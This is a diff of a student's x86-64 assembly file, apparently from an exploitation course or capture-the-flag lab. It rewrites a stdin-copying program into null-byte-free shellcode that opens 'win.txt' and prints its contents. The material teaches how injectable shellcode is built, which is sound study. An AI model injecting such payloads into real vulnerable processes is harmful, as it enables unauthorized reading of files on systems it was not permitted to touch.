@@ -1,18 +1,39 @@
-; Filename: copycat.asm
+; Filename: shellcode.asm
 ; Author: MIDN 2/C Ian Coffey (m261194)
-; Copy from stdin
+; Copy from win
 
 ; Compilation Instructions...
-; nasm -felf64 copycat.asm -o copycat.o
-; ld copycat.o -o copycat
-; ./copycat < something.txt
+; nasm -felf64 shellcode.asm -o shellcode.o
+; ld shellcode.o -o shellcode
+; ./shellcode < something.txt
 
 bits 64 
+
+section .data:
+    win db 'win.txt'
 
 section .text
     global _start
 
 _start:
+    ; Open 'win.txt' file
+    xor rax, rax
+    inc rax
+    inc rax
+    lea rdi, [win]
+    xor rsi, rsi
+    inc rsi
+    inc rsi
+    xor rdx, rdx
+    inc rdx
+    inc rdx
+    syscall
+
+    ; Store fd in r8
+    mov r8, rax
+
+    ; Copy cat starting from here
+    ; Read file to stdout
     xor rbx, rbx  ; zero out rbx to prevent null bytes
                   ; rbx will be used to cmp to rax
     inc rbx       ; rbx = 1
@@ -29,9 +50,9 @@ _loop:
     sub rsp, rcx
 
     ; Setup syscall
-    xor rdi, rdi  ; stdin = 0
+    mov rdi, r8   ; rdi = 'win.txt'
     mov rsi, rsp  ; location of buffer
-    xor rax, rax  ; 0 = read(stdin, buffer, rdx=1)
+    xor rax, rax  ; 0 = read(win, buffer, rdx=1)
     syscall       ; call read()
     
     ; Check if 0 (EOF) is in rax
@@ -40,6 +61,7 @@ _loop:
     nop rax       ; NOP to scew null bytes
 
     ; Setup syscall for write
+    xor rdi, rdi  ; rdi = 0
     inc rdi       ; stdout = 1 
     syscall       ; 1 = write(stdout, buffer, rdx=1)
     
@@ -56,3 +78,6 @@ exit:
     sub rax, 4    ; rax = 60
     xor rdi, rdi  ; rdi = 0
     syscall       ; exit(0)
+
+
+    
